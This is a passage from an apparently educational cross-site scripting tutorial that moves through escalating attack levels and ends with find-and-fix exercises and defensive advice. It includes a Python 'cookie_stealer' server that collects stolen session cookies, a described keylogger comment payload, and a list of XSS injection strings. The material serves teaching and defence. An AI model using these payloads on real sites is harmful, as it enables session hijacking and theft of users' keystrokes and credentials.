...
### 🎯 Attack Level 2: Cookie Theft (Real Danger)

Let's escalate. We'll steal the session cookie.

**First, let's add a login system so there's a cookie to steal.**
...
**Now let's create the attacker's server to receive stolen cookies:**

Create `cookie_stealer.py`:

```python
"""
Attacker's server - receives stolen cookies
...
class StealerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        ...
        if 'cookie' in params:
            ...
            print(f"   Total stolen: {len(stolen_cookies)}\n")
...
if __name__ == '__main__':
    ...
    print(f"👹 Attacker's Cookie Stealer running on http://localhost:{PORT}")
...
### 🎯 Attack Level 3: The Keylogger

Let's go even darker. We'll record every keystroke the victim types.
...
Post this as a comment. Now every time someone types ANYTHING on the page, it gets sent to the attacker's server!

---

### 🎯 Attack Level 4: The Invisible Attack

The previous attacks were visible (you could see the script in the comment). Let's make it invisible:
...
<!-- After escaping, browser receives: -->
&lt;script&gt;alert('XSS')&lt;/script&gt;
...
Now it's your turn! Here are 3 progressively challenging exercises.

---

### 📝 Exercise 1: Find and Fix the XSS

**Scenario:** You inherited this code from a junior developer. Find the XSS vulnerability and fix it.
...
2. **Craft an exploit:** Create a URL that triggers an alert box
3. **Fix the code:** Add proper escaping
4. **Test your fix:** Verify the exploit no longer works

**Bonus:** Add a CSP header for defense-in-depth.

---

### 📝 Exercise 2: Build a Safe Comment System
...
3. Comments must be protected against:
   - `<script>` injection
...
Try to inject these and verify they're blocked or escaped:

1. `<script>alert('XSS')</script>`
2. `<img src=x onerror=alert('XSS')>`
3. `<iframe src="javascript:alert('XSS')"></iframe>`
4. `<svg onload=alert('XSS')>`
5. `<a href="javascript:alert('XSS')">Click</a>`

**Bonus Challenge:** Allow users to post links, but sanitize them safely.
...
# Mock database
users = {{
    'alice': {{'bio': 'I love coding!', 'website': 'https://alice.com'}},
    'bob': {{'bio': 'Security researcher', 'website': 'https://bob.com'}}
}}
...
2. **Document each:**
   ...
   - Write a proof-of-concept exploit URL
...
✅ **Attack techniques:** Cookie theft, keyloggers, worms  
✅ **Defense layers:**
...
3. **Use frameworks** - React, Django, Flask auto-escape by default
4. **Defense in depth** - Multiple layers, not just one
5. **Test your defenses** - Try to break your own code

### Common Mistakes to Avoid:

❌ Filtering blacklists (e.g., blocking `<script>` only)  
✅ Escaping whitelists (escape everything except safe characters)

❌ Escaping on input (you might need the original later)  
✅ Escaping on output (right before displaying)

❌ Trusting client-side validation  
✅ Validating server-side always

❌ Rolling your own sanitization  
✅ Using proven libraries (html.escape, DOMPurify, etc.)
...
- **XSS Hunter:** Detect blind XSS vulnerabilities
- **DOMPurify:** JavaScript library for sanitizing HTML

### Next Topics to Learn:
- **CSRF (Cross-Site Request Forgery):** Forcing users to perform unwanted actions
- **SQL Injection:** Injecting database queries (after learning SQL)
- **Authentication Bypass:** Breaking login systems
- **SSRF (Server-Side Request Forgery):** Making the server attack itself

---

## 12. Final Challenge: Build Your Own XSS Lab

**Project Idea:** Create a practice platform where users can learn XSS safely.

**Features:**
1. Multiple challenge levels (easy → hard)
2. Built-in hints system
3. Automatic vulnerability detection
4. Scoreboard for tracking progress
5. Both vulnerable and fixed versions
